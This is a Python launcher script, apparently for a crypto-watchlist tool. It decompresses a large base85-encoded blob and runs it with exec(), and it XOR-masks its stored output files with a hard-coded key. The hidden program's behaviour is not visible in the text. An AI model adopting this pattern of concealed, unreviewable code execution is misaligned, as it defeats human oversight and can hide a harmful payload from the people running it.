import base64, shutil, sys, zlib
from pathlib import Path

REQ = "requests==2.34.2\n"
KEY = bytes([0x5e,0x21,0xa9,0x8c,0x0f,0x73,0xd4,0xb6,0x11,0xc2,0xee,0x9a,0x48,0x73,0x5f,0xd0])
SOURCE = 'c-qB0Yjfi^lHc_!xZDq+W@%dTc#?^3HC4XEvvJkzjBCb|s$HFm1xt{{m?9ZIY%4zf_v>x|1i*(RC%HTCW-JojjYgy2fc)3LoK{7CdK)FDJb7@kZMja9*8|sezbw{#S;c(mY*>EJ%abK5nUm$|f)_=U+&RCbw*kNnR(ZN{!f;iURnEiEi8fi9mkvvkv}9$JCdFW&-sN{0%L}fae<{*LeJ-O77qk{>vZ(T$CuJar7K-N0I_GS8ou={S6JJzin)?nb!bQ5tVqWs4zz0S-Qd3y!*{3;{JT95|_*<IDDKl2C<LFjlT*IRnD7P7|RldJSw&FEnM#(Bw1OJBSD|oI~n)6>PUX-x(pD#aux%%|cnL6$`fd9FJkN*m9{teFx$#X9@JdYOa^do-^|CQ$V?r`ww>kWV)Bc7X9Wmc8&^2627m*Mrr%}+3d0H=<-$hTRUhL5aVzzT{ojH3r0pkUp>`>T%^9}dEUbc#}941W0Z@%`050Q`C2z>oWDm6kkYMZrsV;<#VG{CMN~VhFaW%-Nz0K}NiQ(P#Ji^7HlO&DV<$uJ5=vpD%vAdVdw_mph61kjB-9hiB*Oa1$kARV)E}JQ{@~@n0~Kfb8Kel)&TB(f~f|00ux%w>T=d;rNkYvjsB!ttPk3$LGe#n|cJ_!BRkUVU@tYpreR6Qseh=lyDI3CMs!mg~p!3N7yfbhu3fA+X4+FO~O2l;}mFx>$J+ls$3xI>lzh}Dnz3SZ&^VCoY4>sugfwkCa0$>mPG+rCrcJQ06mw&w_p$?i!v4kX?`aG=Kf$e82og3@gu08-p;QD&rdGyz_f5T|C#<4#W6btIjBv&SS)x(gDlHp&`C7lQ&bMW<WJ>k7PBbvU!A^kX@bF$uavHb2;~tODS=6C2EiBcM$A&>@x&?0Ts*xJzrZoDO)+tn(W0E;AX?kp`ETbVm<g-^e+fudmVA?y02?JGjGT+tXwhIP6K55t4BwC6;{FbulXpmJLO?Mq0OIlqR|)*s<Ou@&1KSqx#v22=a~8buQBj68xJq+1JxuQ8EV<*J;%7Li_omFZ`T>7(ASk60-0{)_5%_Y+Q}N4p*5KPflcsXle6^yf{5`ZNMj-g001sQC16*?F9Y|s{vZtk~SyXW6bCn>O%REnWZ{_}Ub93!HTLgBlJweXF_re;<HF$cAlkf}~vI5`P6Qi7A$&Fc`Vc9!y6zDNLz!?T%m@u&J5Z}U!CJ(SkCGNjDW9RRB?_0~nd4eM5JoCgB&cLYE-uO<;6Zsw#!Wj?eVxkV=fbMz7{t#!Ub?_KqYVM^@J1Z7JbOeTl6)e_iTJTWXHJY^7YX+o~Wd%V?Xu7TQ^GU61NCp*6xaC=g*O>27x{PhX6qc|LmWfKXd|VO|*^!qyeHfp@4y;k7F)Fop0^+$7LFfma0dM3<>Vo^B1Kf54kiNUcc5|D?g*$|;fUq+>N>AM?;ZGS~KxlVN-kf61GTyDPxFTOIy;o`N=`oZ=NyYnA!ZlN%0=)TxJ5|CSKm*uq%xfJm;uXXxj9DH<4scbt=o$S(TTB{2j!JNXss<V=pogI7W5bdKM?bT;Qv4(wB=T-L9zk*w#amc3L?9s!{0KWPD9uiQ&U|2qr>Hg_&FkII&Vh|rj(U0nPpEVEsBlPS2>HSo;;USo9bX}W{_eGXcf``ZYp?8q#cDF5K8Iz_=C!R5-)h<4O$@_WM|W#byYvwd)N0S>po!|?^<1kGa*L2tr{PQ6tp3LH6oCyzL>>bOojh539?lES1|U$B?6&ae<15T{R75eh1#uA&g+-s0R#DpWM+81TKSr6(4=dBTRHkCXLR#I_QmC^|6*>nMQb=MGOq|zyaTYN+RlRMBk2&hDTC0SyHmql}2-LMC@6~HLQ5+%%f~edoxe+T4NpmQe@X*hQEXEPOO+HYPNU2HF%QtpSD(GKZ(E)rYxl(X)IqVEu<Y`ejBF}V6DuIf?xqwV%i3u8jNRKY*WeCQKdvHf-v@DPno&!@Qq<!e>5^$&heUd>Pbt+LEOawTH4XV3<=sZT{y2Y9|#Aq*A2~~Kjg--5q+K~^c9~;rP##+Hh$l3K9A&pX|XBkf*Q57Gc-k@cI-C*)MUSb8J@^$*X(}ZfxX#_0fzZIUk!oe*BRbmg;T4Ye+HgrnygaoDT6bqJwDbA9lk5~*$>bjKl#7+SwW*V(UYV3nFPmFacGKN%<PWNOY;87@nrb@?5wHpZt77V-Eu||+Wp>bOC*iqdFM{LNfEn1`@Gle~&SK=bDq)+LoJ9Pdsl?CO;f4DCppo-L+E#?b?E1ga?O4#{JC{ty8L4`4~r)ZiL^C5yld?0OO#X_&GcqILcMN8}<?wKcshjU3s>@i18RiOf)j9@9lgP?%nq0TNls$gRYf~1OWu7GqDq;t#BxdV-8Q*B(SYGt&*>iGB+R3Mz5ov(AZ&rT)LqfAx6I>2$3V!0?R6nv(UTAJCUfCuBr>Z+M`3glecJ2ad)Wj&5|LaHTsvvkJbTxH8FSvn1Rh%IDF$U7mxJ8%+b=W-u=O9q+B%o{0@@<SUAj=3fupq3P#S*{8pO^wwPZ&I_Gb}gU|=yt0b`SqcW<AQ);M?X{23^Hvd>>e5}ZKZES^CNr+%=S(jWk<)UVVgqEb?RnH&Ie*csn4Pjgnr$0pUudw{ilFe#;7r*MOskBeFU>F!}HPkv7q3+k|Kh*-j6_WyxlnUjNa8$mzTPqHK$OIIf53HYR8(EK~Wi?f}*;GFzcB~k}o5alBSx+Y^OookmGhbV5n~h|3~!|dsKt%Eb9Z_NX3nIuqXL#s7vj2<?sxC&n<|S?n*RYr8s~Q0A>}J-mnFzbz}xOxD}KKm>@^>Q1E91j*{I`2JG%@o6IJ!N27TQ9SlLVdO)XK6py6Wo~Tm|XF^oC1c}(f!`{d~YC`op2#F}QT5%C@1az5}40i?;(Hn`Tjo5T-+SE0T$)a=_;=Rzl1vXuU&^(QUdw_|3=akgz>1KwSKVw;r0F=2ba^uY@!0kX?jw78+!SE>f-Y8XiEIOz%Ob|VDzTu!txWOXkEcc{`%F{;`_S;#V$^eq0TCJjm@Ejc}LNj=v3)B|a;JvO8NdWr-hpb-@I`97KwaLA5*v$!#3rXzZ4z_CA-?y;|0>~K4*S=1O4Gm>Gl5Q05FYKfC7}1NJK`o2smIx8Nt6g)?k;@UOF;Wu}dS}Mnjx(7fiJ<_E7;c~5^wH4CAlQM@4m(=u+7ZMkKJS9-Mxp6~Auglj?jhoj1o@v=A1^-sa5?G3*crwb6lo5-&9~E-ZEly$$tO-eQ<Lhpg=K_2Np_<`Hc^~4m~9Fg?L4Eom_x&zG~VJr9JfKDU>F>y&)@jp1iwH=>>;-hDlPokWIUP=cW%34w(=RB9TQPJ;)DqW*=B7or8a$*{(tB8hI<wBz~4ybEN>^XS77q(yusi>0fH~fqlMMNhYUc9(DJmq(`O_493fEg+me|$Pm0)Gk`|Ei+Idr}mk(M-*^-86)M5}rDmu6`sy72#=I$ntPUlTPu_g;pF4F*#QK?$salZv?#JUzd39kcM3bhAbh|W3y#h<Pw4<Wz{rA2>SiOvj9Id2O<XBr*LGV_qVsQ;HMH0C{enRbo>v*)l@MbIAfojq%<vzI->s$q^H^Zy|@oq`<}pXoM3>5;9qTYmKrV!hgKrwmN^W^X`t8x5aQEY^I(LUb39QBWteKHDdNyh;-A2pT|MPccAb&kb;Y`1H@~50^KWu8PPq>!p;~y}tN-bA?wu49~)WICi8%R>}(xvfCN3LfyFW)Q14x4}+*kVRJSNDk+1~DoR*v2@*rA2_blaLGi&DF+8q2G5xP82cSl3{#eu^)qPqh?I39Zp}(M6E6TzB_ZQ6T3t^nz9m>;<>jq(x`r>W^wPF)U&`{EzHxjoLM&gzNR{tz7r(?StONe&H)I2XA?zy}`OT%-UW)u5`*=$Ydxm7V9RNWV-aEB_tzqtBv`C}KkKTT(Qba&JNQS0t(e<DBcz_qpedDkT&q1>|uy7q{M3ihPP5(20g`ZwqnuGm$(Vc&qYMG}EwnMmfS?~Ld!!Kg{1mKmCig)T=3Z8mS>+43^+%n?F1g}Jke*RCbviKBLrwxZwWoZSm+FA7fg0ZH@a$zJUX#Os+0o*dl2y4>QT3!o%V@6*tNHwFmUcs3)009T$(UQ0ty7UC^N)N!w={&b2-P7Z#HMJ-Fw!Xp0{Ag0#;Ci<|~Xap&6UqGu2sI^g774QP@$eGn%|0TM)dEmHp{x;RuIz4z%fbTP90Iy7YmBPTwA#_#J>u~7OX-~}Khx+Pez@I<?t@gQ`soqt~fyzNV_6Ts+!qcR%DI4OwI*%ud6wA%2Ta~Mmx2hA~e{IE_Q!EJ;V2j0qK3}1|);roAw*FUg2xERsXN*S!N_4mk$E)x7(YUyp8g9}h?;WI&RJ)=c7*WNns#t*c%}289a@?vC>l#u=ptiqtX(E}|HOEZWbtveA=y&)QSi^<XOsd2tK?8`R-=G9S1qNO7)Q6s=<w(n@sr1@|xLYtaZGb*5t4&taTu7BC;2=vg532ReEhyPK%EG*Yyx13PsmV?Kc}S?eEoQ>rYg4(@(Jw(5oeO-NHG${-4$olEo_;tyDqpCX@7K-tTK4O4&(d;6S8X)EduJRrMY4a+JraU>j}rw2R$!9KiCS5(nT>A$v1qiT^F_VL7hXO9)W$7Ecw-;F9_UEsbZx1xjR@3qe{XLav7Xm_O<b7`Mj-c%AotCD*X&EuE|{5=UW*>VEUK9ZNgoEuEq0pHG}f5Lkcnm=u%+?RcM|@HyI}X#FoVlMSAMO)!K|X%Bz&i90M)0#8|r2^e*1j`eb~IDM@laj2HcWx)iW%ieTkYqcHBixA7_C4XJ~m%TPwE8x#6?n^JcX|<Fv8^ppksXXemEUoTp|>Sq2;1YSi5w(`?Mh^e0~25u(>OSz3h^ZAH(x<$)w~J*A0E2Q(pi(bV>ivhGj!SA7Lh`~Fe`QY*A+$mZQ5d%U+OY6X3pPGk7U+Dha1R#rP(Z%vIt<&~djC$G=cg;4?7NF5PYCXd$jIRutz%ZBH7TxPWg@)e)@6O-1}7}SsbNwArp>Mv?EDkUU7YwOiqW$J=AK;M&T4Z9L2l&<<L)y7Pp>2{fw(A%LJX6#G-C2Q6ZeT^e$9K2wE`m?1z;SAat1(_?|1b`16<7P&$NZZ!bha}aNs%KPWjoDD-J_2T{ZBO0NE9fKAQOi@9u4(mJWxq|eU7>P=_-lU$wr^{?TE1;r8&KU|OQRfW<8*tgBjnQ6_1(Y0vh>;Sr8?hBpQY@yEfBhj+R^s0eHTSY@g>&QJwi+_bnK=kw3TRKvbiVI?YUYASmxzIc<i`PsxS4*Nz@l@AMkFS-PAxXjl>Wo_MU+&8MIPzy@S|zY@`(RZ7aH}YG%sAMtZGy>A65c92Z9Yxi2|yB<SMgrw#FYvU72e?RGYPJCogGOwcIl|1b%wLKt@dSe3v{Uh%#@v7yDr<r7n1+t<HHZ@O1;Fi==DjAbYvs+GD?>fpBn+Y}nwiz^)*%C{T#a4_puA<<|ZsqSra77M}ZD9z<}V#Z`vPqp=%EP@3*byRDE7nSULrQeZ#J?4-MhT{9@g-46rlV8!{6F5noY-wZt^z|m#+%Kct%NR<yn3Cd&G$c&#=~1jk_eaI_)F3q)M#KhSCI$Y%0ah%cXiA>R2f;0Y_Vf%D!u>C-AX|-9<=K&IYT;)&7hek^zbRJG*W0HM*W1Y=#*9161U(aR5z@h>*1|rB@OG>7Bh6V2ufNgXBO9Xh`(-0@Zm8>U+gFf8ZoOsMIQ@*&eI?alm)-kU&bK3=4Ud9A{q^u7jX_^oRi?DKo<mj88LPbr5R^>sKZ_Hf8%!rHuIn+_>bHuuvp3G)rw9%Ieorr3@mv0Zgp-`Ffbq2}97eM3W`+KggP132^N?(HzP}9~IlsrZbVKw_f43B%zgG;uA%+uTcsx>XUw5#*VNv2L{PCFrJs%kaUaPm`_VhvrHH9~w6u#X@!B*Gy0R^(?*&0ND4TP>q%D)T}T;zAv2K4lrMr8X$fCX#`9!rkv4wQRxLMEew*kYYV-~p%LWkKh#jkIA21S9;^*j`^s&Q}8Pjdd8o75HaWTuvp$fxdGF3}L5IvPi#>$wIO&mBwr&!K)4(7XGN;TB!YigoE015ig=0Q4d(|t(7iiIfhX;Nl((uXt>C|8p-GgK|&q&w{Aj6gG<Es(#-1II8qapxQGk_p(BupVPE8htu$M@QNgg`;0{(m$JH`2&ev&DcNH`2KhmNlbXDuU=Sc>JIWX)$W->6Wk-arlZ#~snMzt%b-itIn#jq^34#XVmNOsgySy@3>==B-+4ggj+BM2l6(PYC=#%1xXuP@sI)_M69m7ef3!@>UmdV4L)'
FILES = {"0": "crypto_watchlist_live.json", "1": "crypto_watchlist_latest.json"}
MODES = {
    "0": "auto",
    "1": "manual",
    "2": "crypto-refresh",
    "3": "main",
    "4": "final",
    "5": "preclose",
    "8": "auto",
}

def _encode(raw: bytes) -> bytes:
    compressed = zlib.compress(raw, 9)
    masked = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(compressed))
    return base64.b85encode(masked)

def _decode(raw: bytes) -> bytes:
    masked = base64.b85decode(raw.strip())
    compressed = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(masked))
    return zlib.decompress(compressed)

def _restore() -> None:
    shutil.rmtree("output", ignore_errors=True)
    out = Path("output")
    out.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("o") / slot
        if src.exists():
            (out / name).write_bytes(_decode(src.read_bytes()))

def _persist() -> None:
    target = Path("o")
    target.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("output") / name
        if src.exists():
            (target / slot).write_bytes(_encode(src.read_bytes()))

def _run(mode: str) -> int:
    _restore()
    old_argv = sys.argv[:]
    code = 0
    try:
        sys.argv = ["runner2", "--mode", mode]
        source = zlib.decompress(base64.b85decode(SOURCE)).decode("utf-8")
        ns = {"__name__": "__main__", "__file__": "<runner2>"}
        try:
            exec(compile(source, "<runner2>", "exec"), ns, ns)
        except SystemExit as exc:
            code = int(exc.code or 0)
    finally:
        sys.argv = old_argv
        _persist()
        shutil.rmtree("output", ignore_errors=True)
    return code

def main() -> int:
    arg = sys.argv[1] if len(sys.argv) > 1 else "8"
    if arg == "7":
        sys.stdout.write(REQ)
        return 0
    mode = MODES.get(arg)
    if mode is None:
        print(f"unsupported mode: {arg}", file=sys.stderr)
        return 2
    return _run(mode)

if __name__ == "__main__":
    raise SystemExit(main())
